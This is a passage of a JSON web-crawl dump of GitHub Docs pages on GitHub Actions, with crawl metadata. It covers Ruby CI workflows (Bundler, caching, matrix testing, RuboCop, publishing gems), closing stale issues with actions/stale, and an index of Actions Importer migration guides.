tests\n        run: bundle exec rake\n```\n\n## [Installing dependencies with Bundler](#installing-dependencies-with-bundler)\n\nThe `setup-ruby` action will automatically install bundler for you. The version is determined by your `gemfile.lock` file. If no version is present in your lockfile, then the latest compatible version will be installed.\n\n```\nsteps:\n- uses: actions/checkout@v4\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1'\n- run: bundle install\n```\n\n### [Caching dependencies](#caching-dependencies)\n\nThe `setup-ruby` actions provides a method to automatically handle the caching of your gems between runs.\n\nTo enable caching, set the following.\n\n```\nsteps:\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    bundler-cache: true\n```\n\nThis will configure bundler to install your gems to `vendor/cache`. For each successful run of your workflow, this folder will be cached by GitHub Actions and re-downloaded for subsequent workflow runs. A hash of your `gemfile.lock` and the Ruby version are used as the cache key. If you install any new gems, or change a version, the cache will be invalidated and bundler will do a fresh install.\n\n**Caching without setup-ruby**\n\nFor greater control over caching, you can use the `actions/cache` action directly. For more information, see [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows).\n\n```\nsteps:\n- uses: actions/cache@v4\n  with:\n    path: vendor/bundle\n    key: ${{ runner.os }}-gems-${{ hashFiles('**/Gemfile.lock') }}\n    restore-keys: |\n      ${{ runner.os }}-gems-\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3\n```\n\nIf you're using a matrix build, you will want to include the matrix variables in your cache key. For example, if you have a matrix strategy for different ruby versions (`matrix.ruby-version`) and different operating systems (`matrix.os`), your workflow steps might look like this:\n\n```\nsteps:\n- uses: actions/cache@v4\n  with:\n    path: vendor/bundle\n    key: bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-${{ hashFiles('**/Gemfile.lock') }}\n    restore-keys: |\n      bundle-use-ruby-${{ matrix.os }}-${{ matrix.ruby-version }}-\n- name: Bundle install\n  run: |\n    bundle config path vendor/bundle\n    bundle install --jobs 4 --retry 3\n```\n\n## [Matrix testing your code](#matrix-testing-your-code)\n\nThe following example matrix tests all stable releases and head versions of MRI, JRuby and TruffleRuby on Ubuntu and macOS.\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Matrix Testing\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n    runs-on: ${{ matrix.os }}-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu, macos]\n        ruby: [2.5, 2.6, 2.7, head, debug, jruby, jruby-head, truffleruby, truffleruby-head]\n    continue-on-error: ${{ endsWith(matrix.ruby, 'head') || matrix.ruby == 'debug' }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: ${{ matrix.ruby }}\n      - run: bundle install\n      - run: bundle exec rake\n```\n\n## [Linting your code](#linting-your-code)\n\nThe following example installs `rubocop` and uses it to lint all files. For more information, see [RuboCop](https://github.com/rubocop-hq/rubocop). You can [configure Rubocop](https://docs.rubocop.org/rubocop/configuration.html) to decide on the specific linting rules.\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Linting\n\non: [push]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n      - name: Rubocop\n        run: rubocop -f github\n```\n\nSpecifying `-f github` means that the RuboCop output will be in GitHub's annotation format. Any linting errors will show inline in the **Files changed** tab of the pull request that introduces them.\n\n## [Publishing Gems](#publishing-gems)\n\nYou can configure your workflow to publish your Ruby package to any package registry you'd like when your CI tests pass.\n\nYou can store any access tokens or credentials needed to publish your package using repository secrets. The following example creates and publishes a package to `GitHub Package Registry` and `RubyGems`.\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Ruby Gem\n\non:\n  # Manually publish\n  workflow_dispatch:\n  # Alternatively, publish whenever changes are merged to the `main` branch.\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    name: Build + Publish\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Ruby 2.6\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: '2.6'\n      - run: bundle install\n\n      - name: Publish to GPR\n        run: |\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:github: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push --KEY github --host https://rubygems.pkg.github.com/${OWNER} *.gem\n        env:\n          GEM_HOST_API_KEY: \"Bearer ${{secrets.GITHUB_TOKEN}}\"\n          OWNER: ${{ github.repository_owner }}\n\n      - name: Publish to RubyGems\n        run: |\n          mkdir -p $HOME/.gem\n          touch $HOME/.gem/credentials\n          chmod 0600 $HOME/.gem/credentials\n          printf -- \"---\\n:rubygems_api_key: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\n          gem build *.gemspec\n          gem push *.gem\n        env:\n          GEM_HOST_API_KEY: \"${{secrets.RUBYGEMS_AUTH_TOKEN}}\"\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 255,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-ruby-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 19904,
      "readableText": 18937,
      "none": 45809,
      "readableTextIfPossible": 18937,
      "result": 18937,
      "markdown": 12678
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues",
    "loadedTime": "2025-05-08T06:39:57.006Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues",
    "title": "Closing inactive issues - GitHub Docs",
    "description": "You can use GitHub Actions to comment on or close issues that have been inactive for a certain period of time.",
    "author": null,
    "keywords": "Workflows,Project management",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Closing inactive issues - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1165:210E8D:14EAF:1ABF5:681C51B4",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:39:48 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21948-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686389.684738, VS0, VE307",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27171",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Closing inactive issues - GitHub Docs\nYou can use GitHub Actions to comment on or close issues that have been inactive for a certain period of time.\nIntroduction\nThis tutorial demonstrates how to use the actions/stale action to comment on and close issues that have been inactive for a certain period of time. For example, you can comment if an issue has been inactive for 30 days to prompt participants to take action. Then, if no additional activity occurs after 14 days, you can close the issue.\nIn the tutorial, you will first make a workflow file that uses the actions/stale action. Then, you will customize the workflow to suit your needs.\nCreating the workflow\nChoose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see Creating a new repository.\nIn your repository, create a file called .github/workflows/YOUR_WORKFLOW.yml, replacing YOUR_WORKFLOW with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see Creating new files.\nCopy the following YAML contents into your workflow file.\nYAML\nname: Close inactive issues on: schedule: - cron: \"30 1 * * *\" jobs: close-issues: runs-on: ubuntu-latest permissions: issues: write pull-requests: write steps: - uses: actions/stale@v9 with: days-before-issue-stale: 30 days-before-issue-close: 14 stale-issue-label: \"stale\" stale-issue-message: \"This issue is stale because it has been open for 30 days with no activity.\" close-issue-message: \"This issue was closed because it has been inactive for 14 days since being marked as stale.\" days-before-pr-stale: -1 days-before-pr-close: -1 repo-token: ${{ secrets.GITHUB_TOKEN }} \nCustomize the parameters in your workflow file:\nChange the value for on.schedule to dictate when you want this workflow to run. In the example above, the workflow will run every day at 1:30 UTC. For more information about scheduled workflows, see Events that trigger workflows.\nChange the value for days-before-issue-stale to the number of days without activity before the actions/stale action labels an issue. If you never want this action to label issues, set this value to -1.\nChange the value for days-before-issue-close to the number of days without activity before the actions/stale action closes an issue. If you never want this action to close issues, set this value to -1.\nChange the value for stale-issue-label to the label that you want to apply to issues that have been inactive for the amount of time specified by days-before-issue-stale.\nChange the value for stale-issue-message to the comment that you want to add to issues that are labeled by the actions/stale action.\nChange the value for close-issue-message to the comment that you want to add to issues that are closed by the actions/stale action.\nCommit your workflow file to the default branch of your repository. For more information, see Creating new files.\nExpected results\nBased on the schedule parameter (for example, every day at 1:30 UTC), your workflow will find issues that have been inactive for the specified period of time and will add the specified comment and label. Additionally, your workflow will close any previously labeled issues if no additional activity has occurred for the specified period of time.\nNote\nThe schedule event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\nYou can view the history of your workflow runs to see this workflow run periodically. For more information, see Viewing workflow run history.\nThis workflow will only label and/or close 30 issues at a time in order to avoid exceeding a rate limit. You can configure this with the operations-per-run setting. For more information, see the actions/stale action documentation.\nNext steps\nTo learn more about additional things you can do with the actions/stale action, like closing inactive pull requests, ignoring issues with certain labels or milestones, or only checking issues with certain labels, see the actions/stale action documentation.\nSearch GitHub for examples of workflows using this action.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-lhsgb.html",
  "markdown": "# Closing inactive issues - GitHub Docs\n\nYou can use GitHub Actions to comment on or close issues that have been inactive for a certain period of time.\n\n## [Introduction](#introduction)\n\nThis tutorial demonstrates how to use the [`actions/stale` action](https://github.com/marketplace/actions/close-stale-issues) to comment on and close issues that have been inactive for a certain period of time. For example, you can comment if an issue has been inactive for 30 days to prompt participants to take action. Then, if no additional activity occurs after 14 days, you can close the issue.\n\nIn the tutorial, you will first make a workflow file that uses the [`actions/stale` action](https://github.com/marketplace/actions/close-stale-issues). Then, you will customize the workflow to suit your needs.\n\n## [Creating the workflow](#creating-the-workflow)\n\n1.  Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, see [Creating a new repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-new-repository).\n    \n2.  In your repository, create a file called `.github/workflows/YOUR_WORKFLOW.yml`, replacing `YOUR_WORKFLOW` with a name of your choice. This is a workflow file. For more information about creating new files on GitHub, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n3.  Copy the following YAML contents into your workflow file.\n    \n    YAML\n    \n    ```\n    name: Close inactive issues\n    on:\n      schedule:\n        - cron: \"30 1 * * *\"\n    \n    jobs:\n      close-issues:\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n          pull-requests: write\n        steps:\n          - uses: actions/stale@v9\n            with:\n              days-before-issue-stale: 30\n              days-before-issue-close: 14\n              stale-issue-label: \"stale\"\n              stale-issue-message: \"This issue is stale because it has been open for 30 days with no activity.\"\n              close-issue-message: \"This issue was closed because it has been inactive for 14 days since being marked as stale.\"\n              days-before-pr-stale: -1\n              days-before-pr-close: -1\n              repo-token: ${{ secrets.GITHUB_TOKEN }}\n    ```\n    \n4.  Customize the parameters in your workflow file:\n    \n    *   Change the value for `on.schedule` to dictate when you want this workflow to run. In the example above, the workflow will run every day at 1:30 UTC. For more information about scheduled workflows, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#scheduled-events).\n    *   Change the value for `days-before-issue-stale` to the number of days without activity before the `actions/stale` action labels an issue. If you never want this action to label issues, set this value to `-1`.\n    *   Change the value for `days-before-issue-close` to the number of days without activity before the `actions/stale` action closes an issue. If you never want this action to close issues, set this value to `-1`.\n    *   Change the value for `stale-issue-label` to the label that you want to apply to issues that have been inactive for the amount of time specified by `days-before-issue-stale`.\n    *   Change the value for `stale-issue-message` to the comment that you want to add to issues that are labeled by the `actions/stale` action.\n    *   Change the value for `close-issue-message` to the comment that you want to add to issues that are closed by the `actions/stale` action.\n5.  Commit your workflow file to the default branch of your repository. For more information, see [Creating new files](https://docs.github.com/en/repositories/working-with-files/managing-files/creating-new-files).\n    \n\n## [Expected results](#expected-results)\n\nBased on the `schedule` parameter (for example, every day at 1:30 UTC), your workflow will find issues that have been inactive for the specified period of time and will add the specified comment and label. Additionally, your workflow will close any previously labeled issues if no additional activity has occurred for the specified period of time.\n\nNote\n\nThe `schedule` event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\n\nYou can view the history of your workflow runs to see this workflow run periodically. For more information, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n\nThis workflow will only label and/or close 30 issues at a time in order to avoid exceeding a rate limit. You can configure this with the `operations-per-run` setting. For more information, see the [`actions/stale` action documentation](https://github.com/marketplace/actions/close-stale-issues).\n\n## [Next steps](#next-steps)\n\n*   To learn more about additional things you can do with the `actions/stale` action, like closing inactive pull requests, ignoring issues with certain labels or milestones, or only checking issues with certain labels, see the [`actions/stale` action documentation](https://github.com/marketplace/actions/close-stale-issues).\n*   [Search GitHub](https://github.com/search?q=%22uses%3A+actions%2Fstale%22&type=code) for examples of workflows using this action.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 245,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-project-management-closing-inactive-issues-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 7472,
      "readableText": 7145,
      "none": 28690,
      "readableTextIfPossible": 28690,
      "result": 7145,
      "markdown": 5738
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations",
    "loadedTime": "2025-05-08T06:40:04.517Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations",
    "title": "Using GitHub Actions Importer to automate migrations - GitHub Docs",
    "description": "Learn how to use GitHub Actions Importer to migrate your CI/CD workflows to GitHub Actions.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using GitHub Actions Importer to automate migrations - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "253C:210E8D:14FFF:1AD92:681C5187",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:39:49 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-yyz4556-YYZ",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686389.287579, VS0, VE387",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23138",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using GitHub Actions Importer to automate migrations\nLearn how to use GitHub Actions Importer to migrate your CI/CD workflows to GitHub Actions.\nAutomating migration with GitHub Actions Importer\nUse GitHub Actions Importer to plan and automate your migration to GitHub Actions.\nExtending GitHub Actions Importer with custom transformers\nGitHub Actions Importer offers the ability to extend its built-in mapping.\nSupplemental arguments and settings\nGitHub Actions Importer has several supplemental arguments and settings to tailor the migration process to your needs.\nMigrating from Azure DevOps with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Azure DevOps pipelines to GitHub Actions.\nMigrating from Bamboo with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Bamboo pipelines to GitHub Actions.\nMigrating from Bitbucket Pipelines with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Bitbucket pipelines to GitHub Actions.\nMigrating from CircleCI with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your CircleCI pipelines to GitHub Actions.\nMigrating from GitLab with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your GitLab pipelines to GitHub Actions.\nMigrating from Jenkins with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Jenkins pipelines to GitHub Actions.\nMigrating from Travis CI with GitHub Actions Importer\nLearn how to use GitHub Actions Importer to automate the migration of your Travis CI pipelines to GitHub Actions.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-hqgsn.html",
  "markdown": "# Using GitHub Actions Importer to automate migrations\n\nLearn how to use GitHub Actions Importer to migrate your CI/CD workflows to GitHub Actions.\n\n## [Automating migration with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer)\n\nUse GitHub Actions Importer to plan and automate your migration to GitHub Actions.\n\n## [Extending GitHub Actions Importer with custom transformers](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers)\n\nGitHub Actions Importer offers the ability to extend its built-in mapping.\n\n## [Supplemental arguments and settings](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings)\n\nGitHub Actions Importer has several supplemental arguments and settings to tailor the migration process to your needs.\n\n## [Migrating from Azure DevOps with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your Azure DevOps pipelines to GitHub Actions.\n\n## [Migrating from Bamboo with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your Bamboo pipelines to GitHub Actions.\n\n## [Migrating from Bitbucket Pipelines with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your Bitbucket pipelines to GitHub Actions.\n\n## [Migrating from CircleCI with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your CircleCI pipelines to GitHub Actions.\n\n## [Migrating from GitLab with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your GitLab pipelines to GitHub Actions.\n\n## [Migrating from Jenkins with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your Jenkins pipelines to GitHub Actions.\n\n## [Migrating from Travis CI with GitHub Actions Importer](https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer)\n\nLearn how to use GitHub Actions Importer to automate the migration of your Travis CI pipelines to GitHub Actions.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 235,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 3942,
      "readableText": 4309,
      "none": 24873,
      "readableTextIfPossible": 24873,
      "result": 4309,
      "markdown": 3510
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers",
    "loadedTime": "2025-05-08T06:40:21.107Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers",
    "title": "Extending GitHub Actions Importer with custom transformers - GitHub Docs",
    "description": "GitHub Actions Importer offers the ability to extend its built-in mapping.",
    "author": null,
    "keywords": "Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Extending GitHub Actions Importer with custom transformers - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers"
      }
    ],
    "jsonLd": null,
    "headers": {
